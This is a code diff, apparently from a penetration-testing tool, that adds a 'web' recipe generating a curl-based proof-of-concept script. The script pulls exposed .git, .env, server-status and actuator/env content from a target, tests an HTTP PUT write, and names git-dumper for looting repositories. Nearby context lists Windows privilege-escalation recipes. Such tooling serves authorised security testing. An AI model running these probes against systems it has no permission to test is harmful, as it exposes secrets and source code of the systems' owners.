@@ -61,6 +61,22 @@ def _c_win_dll() -> str:
         "}\n")
 
 
+def _sh_web() -> str:
+    return (
+        "#!/bin/sh\n"
+        "# recce web PoC - proves a web exposure / dangerous-method finding. BENIGN.\n"
+        "# usage: sh recce_poc_web.sh http://TARGET:PORT\n"
+        "U=\"${1:?usage: recce_poc_web.sh http://target:port}\"\n"
+        "echo \"[*] exposed .git/HEAD:\"; curl -sk \"$U/.git/HEAD\"\n"
+        "echo \"[*] exposed .env:\";     curl -sk \"$U/.env\" | head -3\n"
+        "echo \"[*] server-status:\";    curl -sk \"$U/server-status\" | head -3\n"
+        "echo \"[*] actuator/env:\";     curl -sk \"$U/actuator/env\" | head -3\n"
+        "echo \"[*] allowed methods:\";  curl -skI -X OPTIONS \"$U/\" | grep -i '^allow:'\n"
+        "echo \"[*] PUT test (writes a marker if enabled):\"\n"
+        "curl -sk -X PUT \"$U/recce_poc.txt\" -d 'recce_poc'; curl -sk \"$U/recce_poc.txt\"; echo\n"
+        "# For a confirmed .git:  git-dumper \"$U/.git\" ./loot\n")
+
+
 def _c_win_exe() -> str:
     return (
         "/* recce PoC exe - proves execution as the service / intercept account.\n"
@@ -129,6 +145,13 @@ RECIPES: dict[str, dict] = {
                    "dir; start/restart the target exe/service.",
         "proof": "type C:\\recce_poc.txt   -> the target process's context",
     },
+    "web": {
+        "name": "Web exposure / dangerous method -> proof requests",
+        "files": {"recce_poc_web.sh": _sh_web()},
+        "build": ["chmod +x recce_poc_web.sh"],
+        "deliver": "sh recce_poc_web.sh http://<target>:<port>",
+        "proof": "the fetched .git/.env/actuator content, or the PUT marker echoed back.",
+    },
     "win_msi": {
         "name": "AlwaysInstallElevated -> SYSTEM via MSI",
         "files": {},
@@ -148,6 +171,8 @@ _MATCH = [
     (r"path-hijack|path hijack|writable cron|writable .*timer|writable service unit|runs a writable binary|"
      r"writable root|writable library dir", "linux_root_job"),
     (r"alwaysinstallelevated", "win_msi"),
+    (r"exposed (git|\.git|\.env|svn)|\.env file|mod_status exposed|actuator|phpinfo|"
+     r"directory listing enabled|dangerous http methods|web\.config readable", "web"),
     (r"unquoted service|writable service binary|writable autorun|writable scheduled-task|"
      r"writable service registry", "win_service_exe"),
     (r"dll hijack|writable directory in (system|user) path|writable app dir|com inprocserver|com hijack|"
